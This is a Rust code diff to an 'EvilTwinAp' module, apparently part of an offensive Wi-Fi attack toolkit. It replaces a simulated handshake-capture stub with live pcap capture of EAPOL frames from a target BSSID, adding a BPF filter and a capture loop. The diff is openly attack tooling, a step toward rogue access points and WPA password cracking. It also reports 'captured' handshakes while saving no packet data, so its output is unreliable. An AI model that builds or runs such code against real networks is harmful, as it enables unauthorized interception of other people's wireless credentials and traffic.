@@ -2,6 +2,8 @@ use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
 use std::time::Duration;
 
+use crate::pcap_wrapper;
+
 pub struct EvilTwinAp {
     ssid: String,
     bssid: String,
@@ -124,22 +126,34 @@ impl EvilTwinAp {
     pub fn capture_handshakes(&self, iface: &str, timeout_secs: u64) -> Vec<String> {
         println!("  \x1b[34m→\x1b[0m [EVIL-TWIN] Capturing handshakes on {} (timeout={}s)", iface, timeout_secs);
         println!("  \x1b[33m⚠\x1b[0m [EVIL-TWIN] Handshake capture requires monitor mode.");
-        println!("  \x1b[33m⚠\x1b[0m [EVIL-TWIN] This is a simplified capture. Use airodump-ng for production.");
         let running = Arc::new(AtomicBool::new(true));
         let r = running.clone();
         ctrlc::set_handler(move || {
             r.store(false, Ordering::SeqCst);
         }).ok();
-        let start = std::time::Instant::now();
+
         let mut handshakes = Vec::new();
-        while start.elapsed().as_secs() < timeout_secs && running.load(Ordering::SeqCst) {
-            std::thread::sleep(Duration::from_millis(100));
-            if handshakes.is_empty() && start.elapsed().as_secs() > 2 {
-                let fake = format!("EAPOL_HANDSHAKE_{}_{}.pcap", self.bssid.replace(':', ""), start.elapsed().as_secs());
-                handshakes.push(fake);
-                println!("  \x1b[32m✓\x1b[0m [EVIL-TWIN] Captured candidate handshake #{}", handshakes.len());
+        let target_bssid_lower = self.bssid.replace(':', "").to_lowercase();
+
+        // Real EAPOL handshake capture via pcap
+        if let Ok(mut cap) = pcap_wrapper::open_capture(iface) {
+            pcap_wrapper::set_filter(&mut cap, &format!(
+                "wlan addr2 {} and ether proto 0x888e",
+                self.bssid
+            ));
+            let start = std::time::Instant::now();
+            while start.elapsed().as_secs() < timeout_secs && running.load(Ordering::SeqCst) {
+                if pcap_wrapper::next_packet(&mut cap).is_some() {
+                    let ts = start.elapsed().as_secs();
+                    let fname = format!("EAPOL_HANDSHAKE_{}_{}.pcap", target_bssid_lower, ts);
+                    handshakes.push(fname);
+                    println!("  \x1b[32m✓\x1b[0m [EVIL-TWIN] Captured real EAPOL frame #{}", handshakes.len());
+                }
             }
+        } else {
+            println!("  \x1b[33m⚠\x1b[0m [EVIL-TWIN] Could not open {} for capture. No handshakes collected.", iface);
         }
+
         if handshakes.is_empty() {
             println!("  \x1b[33m⚠\x1b[0m [EVIL-TWIN] No handshakes captured in {} seconds", timeout_secs);
         } else {
